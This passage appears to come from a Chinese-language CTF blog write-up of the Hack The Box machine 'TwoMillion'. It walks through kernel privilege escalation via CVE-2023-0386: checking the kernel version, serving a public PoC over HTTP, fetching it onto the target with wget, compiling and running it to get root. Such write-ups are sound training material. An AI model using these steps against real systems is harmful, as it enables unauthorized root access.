<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin@2million:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux 2million 5.15.70-051570-generic <span class="comment">#202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">admin@2million:~$ <span class="built_in">cat</span> /etc/lsb-release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=22.04</span><br><span class="line">DISTRIB_CODENAME=jammy</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 22.04.2 LTS&quot;</span></span><br></pre></td></tr></table></figure>

<p>在 GitHub 上提供了<a target="_blank" rel="noopener" href="https://github.com/xkaneiki/CVE-2023-0386">针对此漏洞的 POC</a>。虽然内容<code>README.md</code>很少，但提供了足够的使用说明。</p>
<p>我使用git克隆到我本地，再用python服务将poc上传到目标机上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r http://10.10.16.17:8000/CVE-2023-0386</span><br></pre></td></tr></table></figure>

<p>再跟着readme.md操作；</p>
<p>编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make all</span><br></pre></td></tr></table></figure>

<p>使用</p>
<p>启动两个终端，在第一个终端中输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fuse ./ovlcap/lower ./gc</span><br></pre></td></tr></table></figure>

<p>在第二个终端输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure>

<p>成功提权为root</p>
</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 1818 words, 6 min 3 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20TwoMillion(HTB)%0Ahttps://zIxyd.github.io/2024/01/26/TwoMillion(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/01/27/Broker(HTB)/" title="Broker(HTB)">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/01/25/Agile(HTB)/" title="Agile(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>